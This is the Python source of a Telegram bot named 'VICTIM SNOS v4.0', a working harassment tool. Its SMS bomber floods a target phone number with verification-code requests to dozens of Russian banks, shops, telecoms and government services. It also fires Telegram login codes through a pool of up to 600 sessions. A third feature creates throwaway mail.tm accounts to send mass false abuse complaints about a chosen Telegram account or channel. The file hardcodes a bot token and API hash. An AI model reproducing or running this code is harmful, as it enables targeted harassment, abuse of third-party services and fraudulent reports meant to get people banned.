import asyncio
import logging
import os
import random
import string
import json
import time
import aiohttp
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS = set()

MAX_SESSIONS = 600
SESSION_DELAY = 30
BOMBER_DELAY = 30
TG_ATTACK_DELAY = 30

USE_MAILTM = True
MAILTM_ACCOUNTS_COUNT = 50
MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"

BANNER_PATH = "banner.png"  # Путь к PNG баннеру

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

active_attacks = {}
sessions_pool = []
sessions_ready = False

class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ComplaintAccountState(StatesGroup):
    waiting_username = State()

class ComplaintChannelState(StatesGroup):
    waiting_channel = State()

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)

        if user_id and user_id != ADMIN_ID and user_id not in ALLOWED_USERS:
            if isinstance(event, types.CallbackQuery):
                await event.answer("У вас нет прав!", show_alert=True)
            elif isinstance(event, types.Message):
                await event.reply("У вас нет прав!")
            return

        return await handler(event, data)

dp.update.middleware(AccessMiddleware())

# ---------- USER-AGENTS ----------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
]

# ---------- САЙТЫ ----------
TELEGRAM_AUTH_SITES = [
    "https://api.fragment.com/auth",
    "https://api.getgems.io/auth/telegram",
    "https://api.tonkeeper.com/auth/telegram",
    "https://api.tonhub.com/auth/telegram",
    "https://api.hamsterkombat.com/auth/telegram",
    "https://api.notcoin.com/auth/telegram",
    "https://api.tapswap.com/auth/telegram",
    "https://api.blum.com/auth/telegram",
    "https://api.cats.com/auth/telegram",
    "https://api.yescoin.com/auth/telegram",
    "https://api.muskempire.com/auth/telegram",
    "https://api.pixelverse.com/auth/telegram",
    "https://api.bybit.com/telegram-auth",
    "https://api.htx.com/telegram-auth",
    "https://api.gate.io/telegram-auth",
    "https://api.kucoin.com/telegram-auth",
    "https://api.mexc.com/telegram-auth",
]

BOMBER_WEBSITES = [
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mail.ru/oauth/token", "method": "POST", "phone_field": "phone"},
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dzen.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://web.whatsapp.com/api/sendCode", "method": "POST", "phone_field": "phone_number"},
    {"url": "https://viber.com/api/request_activation_code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.signal.org/v1/accounts/sms/code/request", "method": "POST", "phone_field": "number"},
    {"url": "https://api.icq.net/auth/sendCode", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yandex.ru/taxi/order", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://eda.yandex/api/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://online.sberbank.ru/CSAFront/api/sms/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vtb.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aliexpress.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lamoda.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.apteka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.eapteka.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.zdravcity.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gorzdrav.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mos.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.drom.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.booking.com/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ostrovok.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.svyaznoy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
]

RECEIVERS = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
]


# ---------- MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        self.ready = False
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                if resp.status == 200:
                    domains = await resp.json()
                    return domains['hydra:member'][0]['domain']
        except:
            pass
        return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"victim{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            }
            
            async with self.session.post(
                f"{self.base_url}/accounts",
                json=account_data,
                headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status in [200, 201]:
                    account_info = await resp.json()
                    
                    login_data = {"address": account_data["address"], "password": account_data["password"]}
                    
                    async with self.session.post(
                        f"{self.base_url}/token",
                        json=login_data,
                        headers={"Content-Type": "application/json"}
                    ) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {
                                "email": account_data["address"],
                                "password": account_data["password"],
                                "token": token_data["token"],
                                "id": account_info["id"]
                            }
        except Exception as e:
            logger.error(f"Mail.tm error: {e}")
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        logger.info(f"Creating {count} mail.tm accounts...")
        
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            await asyncio.sleep(1.5)
        
        self.accounts = accounts
        self.ready = True
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            email_data = {
                "from": account["email"],
                "to": [to_email],
                "subject": subject,
                "text": body
            }
            headers = {
                "Authorization": f"Bearer {account['token']}",
                "Content-Type": "application/json"
            }
            async with self.session.post(
                f"{self.base_url}/messages",
                json=email_data,
                headers=headers
            ) as resp:
                return resp.status in [200, 201, 202]
        except:
            return False


# ---------- СЕССИИ PYROGRAM ----------
async def init_single_session(session_index: int) -> dict:
    session_file = f"sessions/pool_{session_index}"
    try:
        client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": session_index, "last_used": 0}
    except Exception as e:
        logger.error(f"Session {session_index} error: {e}")
        return None


async def init_sessions_background():
    global sessions_pool, sessions_ready
    
    logger.info(f"Initializing {MAX_SESSIONS} sessions...")
    os.makedirs("sessions", exist_ok=True)
    
    batch_size = 50
    for batch_start in range(0, MAX_SESSIONS, batch_size):
        tasks = [init_single_session(i) for i in range(batch_start, min(batch_start + batch_size, MAX_SESSIONS))]
        results = await asyncio.gather(*tasks)
        for r in results:
            if r:
                sessions_pool.append(r)
        logger.info(f"Loaded {len(sessions_pool)}/{MAX_SESSIONS} sessions")
        await asyncio.sleep(1)
    
    sessions_ready = True
    logger.info(f"Sessions ready: {len(sessions_pool)}")


async def get_available_session() -> dict:
    current_time = time.time()
    available = []
    
    for session in sessions_pool:
        if not session["in_use"] and session["flood_until"] < current_time:
            if current_time - session["last_used"] >= SESSION_DELAY:
                available.append(session)
    
    if available:
        session = random.choice(available)
        session["in_use"] = True
        session["last_used"] = current_time
        return session
    return None


def release_session(session: dict):
    if session:
        session["in_use"] = False


# ---------- АТАКИ ----------
async def send_tg_sms(phone: str) -> dict:
    session = await get_available_session()
    if not session:
        return {"type": "SMS", "success": False, "error": "No available sessions"}
    
    try:
        client = session["client"]
        if not client.is_connected:
            await client.connect()
        await client.send_code(phone)
        release_session(session)
        return {"type": "SMS", "success": True, "session": session["index"]}
    except FloodWait as e:
        session["flood_until"] = time.time() + e.value
        release_session(session)
        return {"type": "SMS", "success": False, "flood": e.value, "session": session["index"]}
    except Exception as e:
        release_session(session)
        return {"type": "SMS", "success": False, "error": str(e)[:30]}


async def send_bomber_request(session: aiohttp.ClientSession, phone: str, website: dict) -> dict:
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
    payload = {website["phone_field"]: phone}
    
    try:
        if website["method"] == "POST":
            async with session.post(website["url"], headers=headers, json=payload, timeout=5, ssl=False) as resp:
                return {"site": website["url"].split('/')[2], "success": True}
        else:
            async with session.get(website["url"], headers=headers, params=payload, timeout=5, ssl=False) as resp:
                return {"site": website["url"].split('/')[2], "success": True}
    except:
        return {"site": website["url"].split('/')[2], "success": False}


async def send_tg_auth_request(session: aiohttp.ClientSession, phone: str, website: str) -> dict:
    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
    payload = {'phone': phone, 'phone_number': phone}
    
    try:
        async with session.post(website, headers=headers, json=payload, timeout=5, ssl=False) as resp:
            return {"site": website.split('/')[2], "success": True}
    except:
        return {"site": website.split('/')[2], "success": False}


async def combined_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    results = []
    successful = 0
    failed = 0
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            tasks = []
            
            # Бомбер
            for website in BOMBER_WEBSITES:
                for _ in range(2):
                    tasks.append(send_bomber_request(session, phone, website))
            
            # Telegram авторизация
            for website in TELEGRAM_AUTH_SITES:
                for _ in range(3):
                    tasks.append(send_tg_auth_request(session, phone, website))
            
            # SMS через сессии (до 50 за раунд)
            for _ in range(min(50, len(sessions_pool))):
                tasks.append(send_tg_sms(phone))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, successful, failed)
            
            logger.info(f"Round {rnd}/{rounds}: OK={successful} ERR={failed}")
            
            if rnd < rounds:
                await asyncio.sleep(BOMBER_DELAY)
    
    return results, successful, failed


async def bomber_only_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    results = []
    successful = 0
    failed = 0
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            tasks = []
            
            for website in BOMBER_WEBSITES:
                for _ in range(3):
                    tasks.append(send_bomber_request(session, phone, website))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, successful, failed)
            
            if rnd < rounds:
                await asyncio.sleep(BOMBER_DELAY)
    
    return results, successful, failed


# ---------- ЖАЛОБЫ ----------
async def send_mass_complaint_account(mail_tm: MailTM, username: str) -> int:
    if not mail_tm.accounts:
        return 0
    
    body = f"""Здравствуйте, поддержка Telegram!

Прошу проверить аккаунт @{username} на предмет нарушения правил платформы.
Данный аккаунт используется для рассылки спама и мошеннических действий.

Пожалуйста, примите меры.

С уважением,
Пользователь Telegram"""

    subject = f"Жалоба на аккаунт @{username}"
    
    sent = 0
    semaphore = asyncio.Semaphore(10)
    
    async def send_one(account, receiver):
        async with semaphore:
            result = await mail_tm.send_email(account, receiver, subject, body)
            await asyncio.sleep(1)
            return result
    
    tasks = []
    for account in mail_tm.accounts[:30]:
        for receiver in RECEIVERS[:3]:
            tasks.append(send_one(account, receiver))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


async def send_mass_complaint_channel(mail_tm: MailTM, channel: str) -> int:
    if not mail_tm.accounts:
        return 0
    
    body = f"""Здравствуйте, поддержка Telegram!

Прошу проверить канал {channel} на предмет нарушения правил платформы.
В данном канале распространяется запрещенный контент.

Пожалуйста, примите меры.

С уважением,
Пользователь Telegram"""

    subject = f"Жалоба на канал {channel}"
    
    sent = 0
    semaphore = asyncio.Semaphore(10)
    
    async def send_one(account, receiver):
        async with semaphore:
            result = await mail_tm.send_email(account, receiver, subject, body)
            await asyncio.sleep(1)
            return result
    
    tasks = []
    for account in mail_tm.accounts[:30]:
        for receiver in RECEIVERS[:3]:
            tasks.append(send_one(account, receiver))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


# ---------- ОТЧЕТЫ ----------
def generate_report(phone: str, results: list, successful: int, failed: int, attack_type: str) -> str:
    lines = [
        f"VICTIM SNOS - {attack_type} REPORT",
        "=" * 50,
        f"Phone: {phone}",
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Success: {successful}",
        f"Failed: {failed}",
        "=" * 50,
        ""
    ]
    
    site_stats = {}
    sms_ok = sms_err = 0
    
    for r in results:
        if r.get('type') == 'SMS':
            if r.get('success'):
                sms_ok += 1
            else:
                sms_err += 1
        else:
            site = r.get('site', 'Unknown')
            if site not in site_stats:
                site_stats[site] = {"ok": 0, "err": 0}
            if r.get('success'):
                site_stats[site]["ok"] += 1
            else:
                site_stats[site]["err"] += 1
    
    if sms_ok > 0 or sms_err > 0:
        lines.append(f"SMS: OK={sms_ok} ERR={sms_err}")
    
    for site, stats in site_stats.items():
        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
    
    return "\n".join(lines)


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="КОМБО АТАКА", callback_data="combo_attack")
    builder.button(text="SMS БОМБЕР", callback_data="bomber_attack")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="complaint_account")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="complaint_channel")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop_attack")
    builder.adjust(1)
    return builder.as_markup()


async def send_banner(message: types.Message, caption: str, reply_markup=None):
    if os.path.exists(BANNER_PATH):
        await message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=caption,
            reply_markup=reply_markup
        )
    else:
        await message.answer(caption, reply_markup=reply_markup)


async def edit_with_banner(callback: types.CallbackQuery, caption: str, reply_markup=None):
    await callback.message.delete()
    if os.path.exists(BANNER_PATH):
        await callback.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=caption,
            reply_markup=reply_markup
        )
    else:
        await callback.message.answer(caption, reply_markup=reply_markup)


# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    caption = (
        "<b>VICTIM SNOS v4.0</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS} {'[ГОТОВ]' if sessions_ready else '[ЗАГРУЗКА]'}\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} {'[ГОТОВ]' if mail_tm.ready else '[ЗАГРУЗКА]'}\n"
        f"Задержка SMS: {SESSION_DELAY} сек\n\n"
        "Выберите действие:"
    )
    await send_banner(message, caption, get_main_menu())


@dp.callback_query(F.data == "main_menu")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    caption = (
        "<b>VICTIM SNOS - Главное меню</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS}\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}"
    )
    await edit_with_banner(callback, caption, get_main_menu())
    await callback.answer()


@dp.callback_query(F.data == "status")
async def status(callback: types.CallbackQuery):
    caption = (
        "<b>СТАТУС</b>\n\n"
        f"Сессии: {len(sessions_pool)}/{MAX_SESSIONS}\n"
        f"Готовность: {'Да' if sessions_ready else 'Нет'}\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
        f"Готовность почты: {'Да' if mail_tm.ready else 'Нет'}\n"
        f"Задержка SMS: {SESSION_DELAY} сек"
    )
    await edit_with_banner(callback, caption, InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
    ]))
    await callback.answer()


@dp.callback_query(F.data == "combo_attack")
async def combo_attack_start(callback: types.CallbackQuery, state: FSMContext):
    if not sessions_ready:
        await callback.answer("Сессии еще загружаются!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_phone)
    await callback.message.edit_text(
        "<b>КОМБО АТАКА</b>\n\nВведите номер телефона:\nФормат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()


@dp.callback_query(F.data == "bomber_attack")
async def bomber_attack_start(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(BomberState.waiting_phone)
    await callback.message.edit_text(
        "<b>SMS БОМБЕР</b>\n\nВведите номер телефона:\nФормат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()


@dp.callback_query(F.data == "complaint_account")
async def complaint_account_start(callback: types.CallbackQuery, state: FSMContext):
    if not mail_tm.ready:
        await callback.answer("Почта еще загружается!", show_alert=True)
        return
    
    await state.set_state(ComplaintAccountState.waiting_username)
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()


@dp.callback_query(F.data == "complaint_channel")
async def complaint_channel_start(callback: types.CallbackQuery, state: FSMContext):
    if not mail_tm.ready:
        await callback.answer("Почта еще загружается!", show_alert=True)
        return
    
    await state.set_state(ComplaintChannelState.waiting_channel)
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()


@dp.message(StateFilter(AttackState.waiting_phone))
async def combo_process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")


@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-5):")


@dp.message(StateFilter(AttackState.waiting_count))
async def combo_process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 5:
            await message.answer("Введите число от 1 до 5!")
            return
    except:
        await message.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    
    await state.clear()
    
    status_msg = await message.answer(f"<b>КОМБО АТАКА ЗАПУЩЕНА</b>\n\nНомер: {phone}\nРаундов: {count}")
    
    async def update_progress(current, total, successful, failed):
        try:
            await status_msg.edit_text(
                f"<b>КОМБО АТАКА</b>\n\n"
                f"Номер: {phone}\n"
                f"Раунд: {current}/{total}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}"
            )
        except:
            pass
    
    results, successful, failed = await combined_attack(phone, count, update_progress)
    report = generate_report(phone, results, successful, failed, "COMBO")
    
    filename = f"combo_{phone.replace('+', '')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
    os.remove(filename)
    await status_msg.delete()
    
    caption = "<b>Главное меню</b>"
    await send_banner(message, caption, get_main_menu())


@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 5:
            await message.answer("Введите число от 1 до 5!")
            return
    except:
        await message.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    
    await state.clear()
    
    status_msg = await message.answer(f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}")
    
    async def update_progress(current, total, successful, failed):
        try:
            await status_msg.edit_text(
                f"<b>БОМБЕР</b>\n\n"
                f"Номер: {phone}\n"
                f"Раунд: {current}/{total}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}"
            )
        except:
            pass
    
    results, successful, failed = await bomber_only_attack(phone, count, update_progress)
    report = generate_report(phone, results, successful, failed, "BOMBER")
    
    filename = f"bomber_{phone.replace('+', '')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
    os.remove(filename)
    await status_msg.delete()
    
    caption = "<b>Главное меню</b>"
    await send_banner(message, caption, get_main_menu())


@dp.message(StateFilter(ComplaintAccountState.waiting_username))
async def process_complaint_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace("@", "")
    await state.clear()
    
    status_msg = await message.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint_account(mail_tm, username)
    await status_msg.delete()
    
    await message.answer(f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nОтправлено: {sent} писем")
    
    caption = "<b>Главное меню</b>"
    await send_banner(message, caption, get_main_menu())


@dp.message(StateFilter(ComplaintChannelState.waiting_channel))
async def process_complaint_channel(message: types.Message, state: FSMContext):
    channel = message.text.strip()
    await state.clear()
    
    status_msg = await message.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint_channel(mail_tm, channel)
    await status_msg.delete()
    
    await message.answer(f"<b>ГОТОВО!</b>\n\nКанал: {channel}\nОтправлено: {sent} писем")
    
    caption = "<b>Главное меню</b>"
    await send_banner(message, caption, get_main_menu())


@dp.callback_query(F.data == "stop_attack")
async def stop_attack(callback: types.CallbackQuery):
    await edit_with_banner(callback, "<b>Остановлено</b>", get_main_menu())
    await callback.answer()


# ---------- ЗАПУСК ----------
mail_tm = MailTM()


async def init_mailtm_background():
    try:
        with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
            mail_tm.accounts = json.load(f)
            mail_tm.ready = True
            logger.info(f"Loaded {len(mail_tm.accounts)} mail.tm accounts")
    except:
        logger.info("Creating new mail.tm accounts...")
        await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
        if mail_tm.accounts:
            with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                json.dump(mail_tm.accounts, f)


async def main():
    logger.info("VICTIM SNOS v4.0 starting...")
    
    await bot.delete_webhook(drop_pending_updates=True)
    
    # Фоновые задачи
    asyncio.create_task(init_sessions_background())
    asyncio.create_task(init_mailtm_background())
    
    logger.info("Bot started!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
